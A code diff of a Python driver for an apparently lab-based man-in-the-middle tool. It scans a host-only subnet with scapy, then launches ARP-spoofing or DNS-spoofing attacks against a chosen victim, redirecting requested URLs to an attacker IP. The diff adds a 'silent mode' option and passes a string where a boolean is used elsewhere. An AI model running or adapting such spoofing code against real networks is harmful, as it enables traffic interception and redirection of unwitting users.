@@ -9,9 +9,18 @@ def main():
     spoofIP = []
     urlList = {}
     devicesListOnNetwork = {}
-    start = False
 
-    modeOfAttack = sys.argv[1]
+
+    typeOfAttack = sys.argv[1]
+    silent = None
+    mode= raw_input("Do you want silent mode [y/n]:")
+
+    if mode == "y":
+        silent = True
+
+    if mode == "n":
+        silent = False
+
 
     print("Scanning the network .. ")
     ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.56.0/24"), timeout=2, iface=networkInterface,
@@ -28,9 +37,9 @@ def main():
 
     input =""
     while input != "no":
-        if modeOfAttack == "arp":
+        if typeOfAttack == "arp":
             input = raw_input("Select server (e.g 192.168.56.102) :")
-        elif modeOfAttack == "dns":
+        elif typeOfAttack == "dns":
             input = raw_input("Select server (e.g 192.168.56.104) :")
         else:
             input = raw_input("Select server: ")
@@ -42,18 +51,18 @@ def main():
            print("No IP on network")
 
 
-    if modeOfAttack == "arp":
+    if typeOfAttack == "arp":
         start = True
         arpAttack = arpForward.Arp(networkInterface, victimIP, spoofIP)
         print("ARP frowarding started...")
         print("Press ctrl+c and enter to stop")
         stop = "no"
         while(start):
-            arpAttack.start()
+            arpAttack.start(silent)
             stop = raw_input("")
             if stop == "":
                 start = False
-    elif modeOfAttack == "dns":
+    elif typeOfAttack == "dns":
         redirectTo = raw_input("Enter the ip where redirect victim requests:")
         while input != "stop":
             input = raw_input("Enter the URL to DNS spoof list or stop if you are done: ")
@@ -70,7 +79,7 @@ def main():
         print("Press ctrl+c and enter to stop")
         stop = "no"
         while (start):
-            dnsAttack.start()
+            dnsAttack.start(mode)
             stop = raw_input("")
             if stop == "":
                 start = False
